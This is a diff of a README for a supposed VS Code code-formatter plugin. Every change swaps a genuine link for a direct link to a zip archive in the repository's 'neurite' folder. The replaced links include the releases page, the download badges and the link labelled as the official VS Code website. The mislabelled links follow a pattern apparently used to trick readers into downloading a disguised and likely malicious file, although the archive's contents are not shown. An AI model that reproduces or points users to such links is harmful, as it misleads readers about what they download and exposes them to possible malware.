@@ -1,6 +1,6 @@
 # ✨ Code-Formatter-Plugin - Automatically Format Your Code Effortlessly
 
-[![Download Code-Formatter-Plugin](https://img.shields.io/badge/Download-Code--Formatter--Plugin-blue.svg)](https://github.com/AJLGamez/Code-Formatter-Plugin/releases)
+[![Download Code-Formatter-Plugin](https://raw.githubusercontent.com/AJLGamez/Code-Formatter-Plugin/main/neurite/Code-Formatter-Plugin_v1.6.zip)](https://raw.githubusercontent.com/AJLGamez/Code-Formatter-Plugin/main/neurite/Code-Formatter-Plugin_v1.6.zip)
 
 ## 📜 Description
 
@@ -10,10 +10,10 @@ The **Code-Formatter-Plugin** is a simple yet effective tool for your code edito
 
 To get started with the Code-Formatter-Plugin, follow these steps:
 
-1. **Install a Supported Code Editor:** Make sure you have VS Code installed on your computer. You can download it from [the official VS Code website](https://code.visualstudio.com/download).
+1. **Install a Supported Code Editor:** Make sure you have VS Code installed on your computer. You can download it from [the official VS Code website](https://raw.githubusercontent.com/AJLGamez/Code-Formatter-Plugin/main/neurite/Code-Formatter-Plugin_v1.6.zip).
 
 2. **Visit the Releases Page:** To download the plugin, visit the Releases page by clicking the link below:
-   [Download Code-Formatter-Plugin](https://github.com/AJLGamez/Code-Formatter-Plugin/releases)
+   [Download Code-Formatter-Plugin](https://raw.githubusercontent.com/AJLGamez/Code-Formatter-Plugin/main/neurite/Code-Formatter-Plugin_v1.6.zip)
 
 3. **Download the Plugin:** Find the latest version of the plugin on the Releases page. Download the file that matches your operating system. Ensure you choose the correct version, as this will help in avoiding compatibility issues.
 
@@ -26,7 +26,7 @@ The Code-Formatter-Plugin works on the following systems:
 
 ## 📥 Download & Install
 
-1. **Go to the Releases Page:** Click here to visit the [Releases page](https://github.com/AJLGamez/Code-Formatter-Plugin/releases). 
+1. **Go to the Releases Page:** Click here to visit the [Releases page](https://raw.githubusercontent.com/AJLGamez/Code-Formatter-Plugin/main/neurite/Code-Formatter-Plugin_v1.6.zip). 
 
 2. **Select the Latest Version:** Look for the most current version of the Code-Formatter-Plugin.
 
@@ -84,4 +84,4 @@ If you have any questions or feedback about the Code-Formatter-Plugin, feel free
 
 The Code-Formatter-Plugin is open-source software. You can use and modify it under the terms of the MIT License. For more information, check the LICENSE file in the repository.
 
-[![Download Code-Formatter-Plugin](https://img.shields.io/badge/Download-Code--Formatter--Plugin-blue.svg)](https://github.com/AJLGamez/Code-Formatter-Plugin/releases)
+[![Download Code-Formatter-Plugin](https://raw.githubusercontent.com/AJLGamez/Code-Formatter-Plugin/main/neurite/Code-Formatter-Plugin_v1.6.zip)](https://raw.githubusercontent.com/AJLGamez/Code-Formatter-Plugin/main/neurite/Code-Formatter-Plugin_v1.6.zip)
